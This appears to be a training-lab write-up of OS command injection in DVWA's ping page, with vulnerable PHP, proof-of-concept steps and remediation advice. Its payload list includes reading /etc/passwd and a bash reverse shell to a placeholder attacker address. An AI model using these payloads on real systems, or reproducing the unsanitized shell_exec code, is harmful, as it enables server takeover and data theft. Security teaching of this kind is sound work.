OS Command Injection 
1. Vulnerability Summary
OS Command Injection is one of the most critical web vulnerabilities. It occurs when a web application passes user-supplied data (such as an IP address) directly to the system shell to execute a command (e.g., ping) without proper sanitization. This allows an attacker to execute arbitrary system commands on the host server with the privileges of the web application.

2. Test Environment 
Path: vulnerabilities/exec/

Mechanism: The page provides an input field that asks for an IP address. The application then performs a ping command against that address to verify connectivity.

3. Exploitation Steps (PoC)
Step 1: Normal Testing
When entering 127.0.0.1 (localhost), the server executes:
ping -c 4 127.0.0.1

Step 2: Command Injection
Instead of just entering an IP, we append an additional command using "Command Separators" such as ;, &&, or ||.

Payload Example:

Plaintext
127.0.0.1; ls
Step 3: Result
Instead of just running ping, the server executes both commands sequentially:

ping -c 4 127.0.0.1

ls (This lists the files and directories in the current server folder).

4. Common Payloads for Testing
List current directory contents:
127.0.0.1; ls -la

Read system files (e.g., user list):
127.0.0.1; cat /etc/passwd

Identify the current user:
127.0.0.1; whoami

Reverse Shell (to connect back to your machine):
127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1

5. Technical Root Cause
At the "Low" security level, there is no protection. The PHP code takes the input directly and places it inside the shell_exec() function:

PHP
$target = $_REQUEST[ 'ip' ];
$cmd = shell_exec( 'ping -c 4 ' . $target );
echo "<pre>" . $cmd . "</pre>";
The vulnerability exists because $target is not validated, allowing the user to terminate the ping command and append a new one.

6. Remediation (How to fix)
Use Safe Functions: Avoid using shell_exec(), system(), or exec() whenever possible.

Validation: If the input is an IP address, strictly validate it using filter_var($ip, FILTER_VALIDATE_IP) or a strict Regular Expression.

Sanitization: Use escapeshellarg() in PHP, which escapes the input string so it is treated as a single argument rather than executable commands.